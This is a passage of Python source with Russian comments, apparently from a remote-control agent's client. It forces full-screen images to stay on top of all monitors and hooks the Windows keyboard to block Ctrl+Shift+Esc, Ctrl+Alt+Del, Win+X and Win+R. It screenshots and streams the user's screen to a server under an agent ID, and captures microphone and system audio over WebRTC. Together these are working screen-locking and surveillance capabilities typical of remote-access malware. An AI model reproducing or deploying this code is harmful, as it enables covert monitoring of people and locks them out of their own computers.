                                canvas.itemconfig(item, image=photo)
                                canvas.update()  # Форсируем отрисовку
                                rendered_any = True
                        except Exception as e:
                            print(f"[DEBUG render_frame] Error rendering on monitor {i}: {e}")
                            pass

                    return rendered_any

                def draw_first_frame():
                    """Отрисовывает первый кадр."""
                    if stop_event.is_set():
                        return

                    try:
                        if render_frame():
                            first_frame_drawn[0] = True
                            # Обновляем все окна после отрисовки
                            root.update()
                            for win in windows:
                                win.update()
                        else:
                            # Если render_frame вернул False — пробуем снова, но не бесконечно
                            if not stop_event.is_set():
                                root.after(100, draw_first_frame)
                    except Exception as e:
                        try:
                            with open(os.path.join(os.environ.get('TEMP', '.'), f'fs_error_{os.getpid()}.log'), 'a') as f:
                                f.write(f"draw_first_frame error: {str(e)}\n")
                                import traceback
                                f.write(traceback.format_exc())
                        except:
                            pass

                def update():
                    """Цикл обновления кадров."""
                    if stop_event.is_set():
                        root.quit()
                        return

                    try:
                        # Переходим к следующему кадру
                        if is_animated:
                            frame_idx[0] = (frame_idx[0] + 1) % frame_count

                        # Загружаем и рендерим
                        if not render_frame():
                            # Если ошибка — пробуем снова через секунду
                            root.after(1000, update)
                            return

                        # Получаем задержку для текущего кадра
                        if is_animated:
                            delay = delays[frame_idx[0]] if frame_idx[0] < len(delays) else 100
                        else:
                            delay = 100  # Для статичных изображений просто обновляем

                        root.after(delay, update)
                    except Exception as e:
                        try:
                            with open(os.path.join(os.environ.get('TEMP', '.'), f'fs_error_{os.getpid()}.log'), 'a') as f:
                                f.write(f"update error: {str(e)}\n")
                                import traceback
                                f.write(traceback.format_exc())
                        except:
                            pass
                        # Продолжаем цикл
                        root.after(100, update)

                def keep_topmost():
                    """Поддерживает окна поверх всех."""
                    if stop_event.is_set():
                        return

                    for win in windows:
                        try:
                            win.lift()
                            win.attributes('-topmost', True)
                            win.focus_force()
                        except:
                            pass

                    root.after(500, keep_topmost)

                def cleanup_and_quit():
                    """Полная очистка при закрытии."""
                    try:
                        print(f"[DEBUG cleanup_and_quit] Starting cleanup")

                        # Останавливаем все scheduled callbacks
                        for win in list(windows):
                            try:
                                win.destroy()
                            except Exception as e:
                                print(f"[DEBUG cleanup_and_quit] Error destroying window: {e}")
                        windows.clear()

                        # Закрываем root
                        try:
                            root.quit()
                        except Exception as e:
                            print(f"[DEBUG cleanup_and_quit] Error quitting root: {e}")

                        # Удаляем временные файлы
                        for f in list(temp_files):
                            try:
                                _TempFileTracker.remove(f)
                            except:
                                try:
                                    if os.path.exists(f):
                                        os.remove(f)
                                except:
                                    pass
                        temp_files.clear()

                        print(f"[DEBUG cleanup_and_quit] Cleanup completed")
                    except Exception as e:
                        print(f"[DEBUG cleanup_and_quit] Error during cleanup: {e}")

                def check_stop():
                    """Проверяет stop_event и закрывает окна если нужно."""
                    if stop_event.is_set():
                        print(f"[DEBUG check_stop] Stop event set, calling cleanup")
                        cleanup_and_quit()
                    else:
                        root.after(100, check_stop)

                # Даем 100мс на инициализацию окон, потом рисуем первый кадр
                root.after(100, draw_first_frame)

                # Запускаем цикл анимации через 200мс
                root.after(200, update)
                root.after(300, keep_topmost)
                root.after(100, check_stop)

                # Устанавливаем таймер закрытия если указан duration
                if duration > 0:
                    print(f"[DEBUG show_fullscreen_image] Setting timer for {duration} seconds")
                    root.after(int(duration * 1000), lambda: stop_event.set())
                else:
                    # Принудительное закрытие через 10 минут если duration не указан
                    root.after(600000, lambda: stop_event.set())

                # Используем update() вместо mainloop() чтобы не блокировать поток
                try:
                    while not stop_event.is_set():
                        try:
                            root.update()
                            time.sleep(0.01)  # Небольшая задержка чтобы не грузить CPU
                        except tk.TclError as e:
                            print(f"[DEBUG] TclError in update loop: {e}")
                            break
                except Exception as e:
                    print(f"[DEBUG] Exception in update loop: {e}")

                print(f"[DEBUG] Exited update loop")

                # Даем время на завершение cleanup если он запущен через root.after
                time.sleep(0.2)

                # Ждём немного чтобы все окна точно закрылись
                time.sleep(0.5)

                # Очистка кэша PhotoImage
                current_images.clear()

            except Exception as e:
                pass
            finally:
                # Закрываем изображение
                if 'main_img' in locals():
                    try:
                        main_img.close()
                    except:
                        pass
                time.sleep(1)
                for f in temp_files:
                    _TempFileTracker.remove(f)
        
        thread = threading.Thread(target=display_thread, daemon=True)
        thread.start()
        
        time.sleep(0.5)
        
        return True
        
    except Exception:
        for f in temp_files:
            _TempFileTracker.remove(f)
        return False


if platform.system() == "Windows":
    # WinAPI константы для keyboard hook
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    WM_SYSKEYDOWN = 0x0104
    
    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [
            ("vkCode", wintypes.DWORD),
            ("scanCode", wintypes.DWORD),
            ("flags", wintypes.DWORD),
            ("time", wintypes.DWORD),
            ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
        ]
    
    def block_taskmgr_hook():
        """Устанавливает hook для блокировки Ctrl+Shift+Esc, Ctrl+Alt+Del, Win+X."""
        hook_id = [None]
        blocked_keys = {
            0x1B,  # ESC (для Ctrl+Shift+Esc)
            0x2E,  # DELETE (для Ctrl+Alt+Del)
            0x58,  # X (для Win+X)
        }
        
        def low_level_keyboard_proc(nCode, wParam, lParam):
            if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
                kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                vk_code = kb.vkCode
                
                # Проверяем модификаторы
                ctrl = ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000  # VK_CONTROL
                shift = ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000  # VK_SHIFT
                alt = ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000  # VK_MENU
                win = ctypes.windll.user32.GetAsyncKeyState(0x5B) & 0x8000  # VK_LWIN
                
                # Блокируем комбинации:
                # Ctrl+Shift+Esc
                if ctrl and shift and vk_code == 0x1B:
                    return 1  # Блокируем
                
                # Ctrl+Alt+Del (частично — можем только затруднить)
                if ctrl and alt and vk_code == 0x2E:
                    return 1
                
                # Win+X
                if win and vk_code == 0x58:
                    return 1
                
                # Win+R (дополнительная защита)
                if win and vk_code == 0x52:
                    return 1
            
            return ctypes.windll.user32.CallNextHookEx(hook_id[0], nCode, wParam, lParam)
        
        # Создаём C-callback
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        hook_proc = HOOKPROC(low_level_keyboard_proc)
        
        # Устанавливаем hook
        hook_id[0] = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_proc,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        
        return hook_id[0], hook_proc  # Возвращаем для unhook
    
    def unhook_taskmgr(hook_id):
        """Снимает keyboard hook."""
        if hook_id:
            try:
                ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
            except:
                pass
else:
    def block_taskmgr_hook():
        return None, None
    
    def unhook_taskmgr(hook_id):
        pass
def take_screenshot():
    """Снимает скриншот."""
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()
        return json.dumps({"status": "success", "image": img_base64})
    except Exception as e:
        return json.dumps({"error": str(e)})


def screen_stream_worker(agent_id, interval, monitor_index=0):
    """Поток для трансляции экрана."""
    global screen_stream_active

    import random
    worker_id = random.randint(1000, 9999)

    # Инициализируем mss ОДИН РАЗ до цикла (не пересоздаём каждый кадр)
    sct = None
    use_mss = False
    monitor = None
    monitor_rect = None

    if platform.system() == "Windows":
        try:
            import mss as mss_module
            sct = mss_module.mss()
            # mss: индекс 0 = все мониторы, 1+ = физические
            if monitor_index + 1 < len(sct.monitors):
                monitor = sct.monitors[monitor_index + 1]
                monitor_rect = (monitor['left'], monitor['top'],
                               monitor['left'] + monitor['width'],
                               monitor['top'] + monitor['height'])
                use_mss = True
                _log_to_file(f"[STREAM] mss инициализирован, монитор {monitor_index}: {monitor}")
            else:
                _log_to_file(f"[STREAM] Монитор {monitor_index} недоступен (всего {len(sct.monitors)-1}), fallback на ImageGrab")
        except Exception as e:
            _log_to_file(f"[STREAM] mss не доступен: {e}, fallback на ImageGrab")
            sct = None

    mss_error_count = 0
    frame_count = 0

    try:
        while True:
            # Проверяем флаг в начале каждой итерации
            with screen_stream_lock:
                if not screen_stream_active:
                    break

            try:
                screenshot = None

                if use_mss and sct and mss_error_count < 5:
                    try:
                        sct_img = sct.grab(monitor)
                        screenshot = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
                        mss_error_count = 0  # Сброс счётчика при успехе
                    except Exception as e:
                        mss_error_count += 1
                        _log_to_file(f"[STREAM] mss ошибка #{mss_error_count}: {e}")
                        if mss_error_count >= 5:
                            _log_to_file("[STREAM] mss стабильно падает, переключаюсь на ImageGrab")
                        screenshot = None

                # Fallback на ImageGrab
                if screenshot is None:
                    try:
                        screenshot = ImageGrab.grab()
                    except Exception as e:
                        _log_to_file(f"[STREAM] ImageGrab ошибка: {e}")
                        time.sleep(interval)
                        continue

                if screenshot is None:
                    time.sleep(interval)
                    continue

                # Уменьшаем разрешение для более быстрой передачи (в 1.5 раза)
                width, height = screenshot.size
                new_width = int(width * 0.67)
                new_height = int(height * 0.67)
                screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)

                # Получаем позицию курсора и рисуем его
                try:
                    import win32api
                    cursor_pos = win32api.GetCursorPos()

                    # Если захватываем конкретный монитор, корректируем позицию курсора
                    if monitor_rect is not None and use_mss:
                        # Проверяем, находится ли курсор на этом мониторе
                        if (monitor_rect[0] <= cursor_pos[0] < monitor_rect[2] and
                            monitor_rect[1] <= cursor_pos[1] < monitor_rect[3]):
                            cursor_pos = (int((cursor_pos[0] - monitor_rect[0]) * 0.67), int((cursor_pos[1] - monitor_rect[1]) * 0.67))

                            from PIL import ImageDraw
                            draw = ImageDraw.Draw(screenshot)
                            cursor_size = 10
                            draw.line([cursor_pos[0] - cursor_size, cursor_pos[1], cursor_pos[0] + cursor_size, cursor_pos[1]], fill='red', width=2)
                            draw.line([cursor_pos[0], cursor_pos[1] - cursor_size, cursor_pos[0], cursor_pos[1] + cursor_size], fill='red', width=2)
                            draw.ellipse([cursor_pos[0] - 4, cursor_pos[1] - 4, cursor_pos[0] + 4, cursor_pos[1] + 4], outline='red', width=2)
                    else:
                        cursor_pos = (int(cursor_pos[0] * 0.67), int(cursor_pos[1] * 0.67))
                        from PIL import ImageDraw
                        draw = ImageDraw.Draw(screenshot)
                        cursor_size = 10
                        draw.line([cursor_pos[0] - cursor_size, cursor_pos[1], cursor_pos[0] + cursor_size, cursor_pos[1]], fill='red', width=2)
                        draw.line([cursor_pos[0], cursor_pos[1] - cursor_size, cursor_pos[0], cursor_pos[1] + cursor_size], fill='red', width=2)
                        draw.ellipse([cursor_pos[0] - 4, cursor_pos[1] - 4, cursor_pos[0] + 4, cursor_pos[1] + 4], outline='red', width=2)
                except Exception:
                    pass

                img_byte_arr = io.BytesIO()
                screenshot.save(img_byte_arr, format='JPEG', quality=70, optimize=True)
                img_byte_arr.seek(0)
                img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()

                # Проверяем ещё раз перед отправкой
                with screen_stream_lock:
                    if not screen_stream_active:
                        break

                sio.emit('command_result', {
                    'agent_id': agent_id,
                    'result': json.dumps({"stream_frame": img_base64, "worker_id": worker_id, "monitor": monitor_index}, separators=(',', ':'))
                })

                frame_count += 1
                if frame_count <= 3:
                    _log_to_file(f"[STREAM] Кадр #{frame_count} отправлен, размер base64: {len(img_base64)}")

                time.sleep(interval)
            except Exception as e:
                _log_to_file(f"[STREAM] Ошибка в цикле захвата: {e}")
                time.sleep(1)
    finally:
        # Закрываем mss при завершении
        if sct:
            try:
                sct.close()
            except Exception:
                pass
        _log_to_file(f"[STREAM] Worker завершён, отправлено кадров: {frame_count}")


# ═══════════════════════════════════════════════════════════════════
# WEBRTC STREAMING CLASSES
# ═══════════════════════════════════════════════════════════════════

if aiortc_available:
    from aiortc.contrib.media import MediaRelay, MediaPlayer
    
    # ---------------------------------------------------------
    # MONKEY-PATCH AIORTC BITRATE LIMITS FOR HIGH QUALITY STREAM
    # ---------------------------------------------------------
    try:
        import aiortc.codecs.vpx
        aiortc.codecs.vpx.MIN_BITRATE = 2000000      # 2 Mbps
        aiortc.codecs.vpx.MAX_BITRATE = 10000000     # 10 Mbps
        aiortc.codecs.vpx.DEFAULT_BITRATE = 5000000  # 5 Mbps
    except Exception as e:
        _log_to_file(f"[WebRTC] Failed to patch VPX bitrates: {e}")
        
    try:
        import aiortc.codecs.h264
        aiortc.codecs.h264.MIN_BITRATE = 2000000      # 2 Mbps
        aiortc.codecs.h264.MAX_BITRATE = 10000000     # 10 Mbps
        aiortc.codecs.h264.DEFAULT_BITRATE = 5000000  # 5 Mbps
    except Exception as e:
        pass
    # ---------------------------------------------------------

    relay = MediaRelay()

    class ScreenCaptureTrack(VideoStreamTrack):
        """Захватывает экран напрямую без MediaPlayer"""

        def __init__(self, monitor_index=0):
            super().__init__()
            self.sct = mss.mss()

            # Получаем размеры монитора
            monitors = self.sct.monitors
            _log_to_file(f"[WebRTC Video] Available monitors: {len(monitors)}")

            # monitors[0] = все экраны, monitors[1+] = физические
            actual_index = monitor_index + 1
            if actual_index < len(monitors):
                self.monitor = monitors[actual_index]
            else:
                self.monitor = monitors[1] if len(monitors) > 1 else monitors[0]

            _log_to_file(f"[WebRTC Video] Using monitor {actual_index}: {self.monitor}")
            self._frame_count = 0
            self._start_time = time.time()

        async def recv(self):
            """Захватываем скриншот напрямую"""
            try:
                # Захватываем скриншот
                screenshot = self.sct.grab(self.monitor)

                if self._frame_count == 0:
                    print(f"[WebRTC Video] First screenshot captured: size={screenshot.size}, raw_size={len(screenshot.bgra)} bytes")
                    _log_to_file(f"[WebRTC Video] First screenshot captured: size={screenshot.size}, raw_size={len(screenshot.bgra)} bytes")

                # Конвертируем в PIL Image
                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')

                if self._frame_count == 0:
                    print(f"[WebRTC Video] PIL Image created: size={img.size}, mode={img.mode}")
                    _log_to_file(f"[WebRTC Video] PIL Image created: size={img.size}, mode={img.mode}")
            except Exception as e:
                print(f"[WebRTC Video] ERROR capturing screenshot: {e}")
                _log_to_file(f"[WebRTC Video] ERROR capturing screenshot: {e}")
                import traceback
                print(f"[WebRTC Video] Traceback: {traceback.format_exc()}")
                _log_to_file(f"[WebRTC Video] Traceback: {traceback.format_exc()}")
                raise

            # Рисуем курсор поверх скриншота
            try:
                if platform.system() == "Windows":
                    from PIL import ImageDraw
                    # Получаем позицию курсора
                    cursor_info = wintypes.POINT()
                    ctypes.windll.user32.GetCursorPos(ctypes.byref(cursor_info))

                    # Преобразуем в координаты монитора
                    cursor_x = cursor_info.x - self.monitor['left']
                    cursor_y = cursor_info.y - self.monitor['top']

                    # Проверяем, что курсор внутри монитора
                    if 0 <= cursor_x < self.monitor['width'] and 0 <= cursor_y < self.monitor['height']:
                        draw = ImageDraw.Draw(img)
                        # Рисуем простой курсор (белая стрелка с черной обводкой)
                        cursor_size = 16
                        # Черная обводка
                        draw.polygon([
                            (cursor_x, cursor_y),
                            (cursor_x, cursor_y + cursor_size),
                            (cursor_x + cursor_size//3, cursor_y + cursor_size*2//3),
                            (cursor_x + cursor_size*2//3, cursor_y + cursor_size//3)
                        ], fill='black', outline='black')
                        # Белая стрелка
                        draw.polygon([
                            (cursor_x+1, cursor_y+1),
                            (cursor_x+1, cursor_y + cursor_size-2),
                            (cursor_x + cursor_size//3, cursor_y + cursor_size*2//3-1),
                            (cursor_x + cursor_size*2//3-1, cursor_y + cursor_size//3)
                        ], fill='white')
            except Exception as e:
                # Если не удалось нарисовать курсор, продолжаем без него
                pass

            # Уменьшаем разрешение до 50% для VirtualBox совместимости
            try:
                width, height = img.size
                new_width = int(width * 0.5)
                new_height = int(height * 0.5)
                # Убедимся, что размеры четные (кодек требует четных размеров)
                new_width = new_width - (new_width % 2)
                new_height = new_height - (new_height % 2)

                # Используем Image.Resampling.LANCZOS вместо Image.LANCZOS (устарело в новых Pillow)
                resample_filter = getattr(Image, 'Resampling', Image).LANCZOS
                img = img.resize((new_width, new_height), resample_filter)
            except Exception as e:
                # В случае ошибки ресайза просто отправляем как есть, чтобы избежать черного экрана
                pass

            # Конвертируем в av.VideoFrame
            try:
                frame = av.VideoFrame.from_image(img)

                # Генерируем pts на основе времени (30 FPS)
                pts = int((time.time() - self._start_time) * 90000)  # 90kHz clock
                frame.pts = pts
                frame.time_base = fractions.Fraction(1, 90000)

                self._frame_count += 1
                if self._frame_count <= 5 or self._frame_count % 100 == 0:
                    print(f"[WebRTC Video] Frame {self._frame_count} captured: size={img.size}, format={frame.format.name}, pts={frame.pts}, width={frame.width}, height={frame.height}")
                    _log_to_file(f"[WebRTC Video] Frame {self._frame_count} captured: size={img.size}, format={frame.format.name}, pts={frame.pts}, width={frame.width}, height={frame.height}")

                # Ограничиваем FPS до 30
                await asyncio.sleep(1/30)

                return frame
            except Exception as e:
                print(f"[WebRTC Video] ERROR creating VideoFrame: {e}")
                _log_to_file(f"[WebRTC Video] ERROR creating VideoFrame: {e}")
                import traceback
                print(f"[WebRTC Video] Traceback: {traceback.format_exc()}")
                _log_to_file(f"[WebRTC Video] Traceback: {traceback.format_exc()}")
                raise

        def stop(self):
            """Останавливаем трек и освобождаем ресурсы"""
            super().stop()
            try:
                if hasattr(self, 'sct') and self.sct:
                    self.sct.close()
                    self.sct = None
                _log_to_file("[WebRTC Video] Screen capture stopped and mss closed")
            except Exception as e:
                _log_to_file(f"[WebRTC Video] Error closing mss: {e}")

    class MixedAudioTrack(MediaStreamTrack):
        """WebRTC аудио трек для микрофона + системный звук"""
        kind = "audio"

        def __init__(self, mic_device_index=None, sys_device_index=None, enable_mic=True, enable_sys=False):
            super().__init__()
            self.mic_device_index = mic_device_index
            self.sys_device_index = sys_device_index
            self.timestamp = 0
            self.enable_mic = enable_mic
            self.enable_sys = enable_sys

            import queue
            import threading
            self.audio_queue = queue.Queue(maxsize=100) # Буфер на 2 секунды аудио
            self._running = True

            if not pyaudio:
                raise Exception("PyAudio not available")

            self.p = pyaudio.PyAudio()
            self.CHUNK = 960  # 20ms при 48kHz
            self.FORMAT = pyaudio.paInt16
            self.RATE = 48000
            self.CHANNELS = 2

            # Открываем микрофон только если enable_mic=True
            self.mic_stream = None
            if self.enable_mic:
                try:
                    if mic_device_index is not None and mic_device_index != -1:
                        mic_device_info = self.p.get_device_info_by_index(mic_device_index)
                        _log_to_file(f"[Audio] Using mic device {mic_device_index}: {mic_device_info.get('name', 'Unknown')}")
                    else:
                        mic_device_info = self.p.get_default_input_device_info()
                        mic_device_index = mic_device_info['index']
                        _log_to_file(f"[Audio] Using default mic device {mic_device_index}: {mic_device_info.get('name', 'Unknown')}")

                    self.mic_stream = self.p.open(
                        format=self.FORMAT,
                        channels=self.CHANNELS,
                        rate=self.RATE,
                        input=True,
                        frames_per_buffer=self.CHUNK,
                        input_device_index=mic_device_index
                    )
                    _log_to_file(f"[Audio] Microphone stream opened successfully")
                except Exception as e:
                    _log_to_file(f"[Audio] Mic init error: {e}")

            # Логируем ВСЕ доступные аудио устройства
            try:
                device_count = self.p.get_device_count()
                _log_to_file(f"[Audio] Total audio devices: {device_count}")
                print(f"[Audio] Total audio devices: {device_count}")
                for i in range(device_count):
                    try:
                        info = self.p.get_device_info_by_index(i)
                        _log_to_file(f"[Audio] Device {i}: name='{info.get('name')}', inputs={info.get('maxInputChannels')}, outputs={info.get('maxOutputChannels')}, hostApi={info.get('hostApi')}")
                        print(f"[Audio] Device {i}: name='{info.get('name')}', inputs={info.get('maxInputChannels')}, outputs={info.get('maxOutputChannels')}, hostApi={info.get('hostApi')}")
                    except Exception as e:
                        _log_to_file(f"[Audio] Device {i}: error={e}")

                # Логируем host API
                api_count = self.p.get_host_api_count()
                for i in range(api_count):
                    try:
                        api_info = self.p.get_host_api_info_by_index(i)
                        _log_to_file(f"[Audio] Host API {i}: name='{api_info.get('name')}', type={api_info.get('type')}, devices={api_info.get('deviceCount')}")
                        print(f"[Audio] Host API {i}: name='{api_info.get('name')}', type={api_info.get('type')}, devices={api_info.get('deviceCount')}")
                    except Exception:
                        pass
            except Exception as e:
                _log_to_file(f"[Audio] Error listing devices: {e}")
                print(f"[Audio] Error listing devices: {e}")

            # Открываем системный звук только если enable_sys=True
            self.sys_stream = None
            self.sys_rate = self.RATE
            self.sys_channels = self.CHANNELS
            if self.enable_sys:
                try:
                    # Определяем устройство для системного звука
                    sys_dev_index = self.sys_device_index
                    sys_dev_info = None

                    if sys_dev_index is not None and sys_dev_index != -1:
                        sys_dev_info = self.p.get_device_info_by_index(sys_dev_index)
                        _log_to_file(f"[Audio] Using explicit sys device {sys_dev_index}: {sys_dev_info.get('name')}")
                        print(f"[Audio] Using explicit sys device {sys_dev_index}: {sys_dev_info.get('name')}")
                    else:
                        _log_to_file(f"[Audio] Trying get_default_wasapi_loopback()...")
                        print(f"[Audio] Trying get_default_wasapi_loopback()...")
                        wasapi_info = self.p.get_default_wasapi_loopback()
                        if wasapi_info:
                            sys_dev_info = wasapi_info
                            sys_dev_index = wasapi_info['index']
                            _log_to_file(f"[Audio] Found WASAPI loopback: {wasapi_info.get('name')}, index={sys_dev_index}")
                            print(f"[Audio] Found WASAPI loopback: {wasapi_info.get('name')}, index={sys_dev_index}")

                    if sys_dev_info:
                        # Пробуем 48000, если не поддерживается — ищем ближайшую
                        supported_rates = []
                        try:
                            default_rate = int(sys_dev_info.get('defaultSampleRate', 0))
                            if default_rate > 0:
                                supported_rates.append(default_rate)
                            for rate in [44100, 48000, 22050, 16000, 8000]:
                                try:
                                    self.p.open(format=self.FORMAT, channels=2, rate=rate,
                                                input=True, frames_per_buffer=self.CHUNK,
                                                input_device_index=sys_dev_index,
                                                exception_on_overflow=False).close()
                                    supported_rates.append(rate)
                                except:
                                    pass
                        except:
                            pass

                        best_rate = self.RATE
                        if self.RATE not in supported_rates and supported_rates:
                            best_rate = supported_rates[0]
                            _log_to_file(f"[Audio] 48000Hz not supported by sys device, using {best_rate}Hz")
                            print(f"[Audio] 48000Hz not supported by sys device, using {best_rate}Hz")

                        self.sys_rate = best_rate
                        self.sys_channels = min(self.CHANNELS, sys_dev_info.get('maxInputChannels', 2))
                        self.sys_stream = self.p.open(
                            format=self.FORMAT,
                            channels=self.sys_channels,
                            rate=self.sys_rate,
                            input=True,
                            frames_per_buffer=self.CHUNK,
                            input_device_index=sys_dev_index
                        )
                        _log_to_file(f"[Audio] System audio stream opened at {self.sys_rate}Hz")
                        print(f"[Audio] System audio stream opened at {self.sys_rate}Hz")
                    else:
                        _log_to_file(f"[Audio] No WASAPI loopback device found, trying manual search...")
                        print(f"[Audio] No WASAPI loopback device found, trying manual search...")
                        for i in range(self.p.get_device_count()):
                            try:
                                info = self.p.get_device_info_by_index(i)
                                name = info.get('name', '').lower()
                                if ('loopback' in name or 'stereo mix' in name or
                                    'what u hear' in name or 'wave out' in name or 'динамики' in name) and info.get('maxInputChannels', 0) > 0:
                                    _log_to_file(f"[Audio] Found loopback: {info.get('name')}, index={i}")
                                    print(f"[Audio] Found loopback: {info.get('name')}, index={i}")
                                    self.sys_channels = min(self.CHANNELS, info.get('maxInputChannels', 2))
                                    self.sys_stream = self.p.open(
                                        format=self.FORMAT,
                                        channels=self.sys_channels,
                                        rate=self.RATE,
                                        input=True,
                                        frames_per_buffer=self.CHUNK,
                                        input_device_index=i
                                    )
                                    self.sys_rate = self.RATE
                                    _log_to_file(f"[Audio] Manual loopback opened at {self.sys_rate}Hz")
                                    print(f"[Audio] Manual loopback opened at {self.sys_rate}Hz")
                                    break
                            except Exception:
                                pass
                        if not self.sys_stream:
                            _log_to_file(f"[Audio] No loopback device found")
                            print(f"[Audio] No loopback device found")
                except Exception as e:
                    _log_to_file(f"[Audio] Sys audio init error: {e}")
                    print(f"[Audio] Sys audio init error: {e}")
                    import traceback
                    _log_to_file(f"[Audio] Traceback: {traceback.format_exc()}")
                    print(f"[Audio] Traceback: {traceback.format_exc()}")

            # Запускаем непрерывный поток захвата
            self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
            self.capture_thread.start()

        def _capture_loop(self):
            import numpy as np
            _log_to_file(f"[Audio] Audio capture thread started (mic_stream={self.mic_stream is not None}, sys_stream={self.sys_stream is not None})")
            print(f"[Audio] Audio capture thread started (mic_stream={self.mic_stream is not None}, sys_stream={self.sys_stream is not None})")

            # Для точного тайминга генерации пустых фреймов, если нет микрофона
            import time
            next_frame_time = time.time()
            frame_duration = self.CHUNK / self.RATE
            capture_count = 0

            while self._running:
                mic_array = np.zeros((self.CHUNK, self.CHANNELS), dtype=np.int16)
                sys_array = np.zeros((self.CHUNK, self.CHANNELS), dtype=np.int16)
                
                # 1. Захват микрофона (блокирующий метроном)
                if self.mic_stream and self.enable_mic:
                    try:
                        avail = self.mic_stream.get_read_available()
                        if avail > self.CHUNK * 2:
                            self.mic_stream.read(avail - self.CHUNK, exception_on_overflow=False)
                        data = self.mic_stream.read(self.CHUNK, exception_on_overflow=False)
                        data_arr = np.frombuffer(data, dtype=np.int16)
                        if len(data_arr) == self.CHUNK * self.CHANNELS:
                            mic_array = data_arr.reshape(-1, self.CHANNELS)
                    except Exception:
                        pass
                elif self.mic_stream and not self.enable_mic:
                    # Flush buffer silently
                    try:
                        avail = self.mic_stream.get_read_available()
                        if avail > 0:
                            self.mic_stream.read(avail, exception_on_overflow=False)
                    except: pass
                    
                    # Sleep to pace
                    now = time.time()
                    if next_frame_time > now:
                        time.sleep(next_frame_time - now)
                    next_frame_time += frame_duration
                else:
                    # Если микрофона нет, спим чтобы выдерживать тайминг
                    now = time.time()
                    if next_frame_time > now:
                        time.sleep(next_frame_time - now)
                    next_frame_time += frame_duration
                
                # 2. Захват системного звука (неблокирующий)
                if self.sys_stream and self.enable_sys:
                    try:
                        avail = self.sys_stream.get_read_available()
                        # Вычисляем сколько сэмплов нужно прочитать для sys_rate
                        sys_chunk_size = int(self.CHUNK * self.sys_rate / self.RATE)
                        if avail >= sys_chunk_size:
                            data = self.sys_stream.read(sys_chunk_size, exception_on_overflow=False)
                            data_arr = np.frombuffer(data, dtype=np.int16)
                            channels = self.sys_channels if self.sys_stream else 2
                            expected_samples = sys_chunk_size * channels
                            if len(data_arr) >= expected_samples:
                                if len(data_arr) == expected_samples:
                                    raw_sys = data_arr.reshape(-1, channels)
                                else:
                                    raw_sys = data_arr[:expected_samples].reshape(-1, channels)
                                # Ресемплинг если sys_rate != RATE
                                if self.sys_rate != self.RATE:
                                    n_target = self.CHUNK
                                    indices = np.linspace(0, len(raw_sys) - 1, n_target).astype(np.float32)
                                    resampled = np.zeros((n_target, channels), dtype=np.int16)
                                    for ch in range(channels):
                                        resampled[:, ch] = np.interp(indices, np.arange(len(raw_sys)), raw_sys[:, ch]).astype(np.int16)
                                    sys_array[:, :channels] = resampled
                                else:
                                    sys_array[:, :channels] = raw_sys[:, :self.CHANNELS]
                            excess = self.sys_stream.get_read_available()
                            if excess > self.CHUNK * 2:
                                self.sys_stream.read(excess, exception_on_overflow=False)
                        elif avail > 0:
                            self.sys_stream.read(avail, exception_on_overflow=False)
                    except Exception:
                        pass
                elif self.sys_stream and not self.enable_sys:
                    try:
                        avail = self.sys_stream.get_read_available()
                        if avail > 0:
                            self.sys_stream.read(avail, exception_on_overflow=False)
                    except: pass

                # Микшируем
                mixed = (mic_array.astype(np.int32) + sys_array.astype(np.int32))
                np.clip(mixed, -32768, 32767, out=mixed)
                mixed = mixed.astype(np.int16)

                # Просто передаем звук как есть, без тестового тона
                capture_count += 1
                mic_max = int(np.max(np.abs(mic_array)))
                sys_max = int(np.max(np.abs(sys_array)))
                mix_max_val = int(np.max(np.abs(mixed)))

                # Кладем в очередь
                try:
                    # Если очередь полная (зависла сеть), старые фреймы выбрасываем
                    if self.audio_queue.full():
                        self.audio_queue.get_nowait()
                    self.audio_queue.put_nowait(mixed)
                    if capture_count <= 5 or capture_count % 500 == 0:
                        _log_to_file(f"[Audio] Capture #{capture_count}: mic_max={mic_max}, sys_max={sys_max}, mix_max={mix_max_val}, queue_size={self.audio_queue.qsize()}")
                        print(f"[Audio] Capture #{capture_count}: mic_max={mic_max}, sys_max={sys_max}, mix_max={mix_max_val}, queue_size={self.audio_queue.qsize()}")
                except Exception:
                    pass

        async def recv(self):
            """Отдаем фреймы WebRTC из готовой очереди"""
            try:
                from fractions import Fraction
                import queue
                import numpy as np

                if not hasattr(self, '_recv_count'):
                    self._recv_count = 0

                mixed = None
                # Ждем кадр из очереди. Если пусто - ждем короткое время,
                # чтобы не блокировать полностью event loop
                while self._running:
                    try:
                        loop = asyncio.get_event_loop()
                        # Ждем данные с небольшим таймаутом
                        mixed = await loop.run_in_executor(None, lambda: self.audio_queue.get(timeout=0.05))
                        break
                    except queue.Empty:
                        if not self._running:
                            raise Exception("Track stopped")
                        # Продолжаем ждать пока _running == True
                        continue

                if mixed is None:
                    mixed = np.zeros((self.CHUNK, self.CHANNELS), dtype=np.int16)

                # Конвертируем в av.AudioFrame
                frame = av.AudioFrame(format='s16', layout='stereo', samples=self.CHUNK)
                frame.sample_rate = self.RATE
                frame.pts = self.timestamp
                frame.time_base = Fraction(1, self.RATE)

                for plane in frame.planes:
                    plane.update(mixed.tobytes())

                self.timestamp += self.CHUNK
                self._recv_count += 1
                if self._recv_count <= 3 or self._recv_count % 500 == 0:
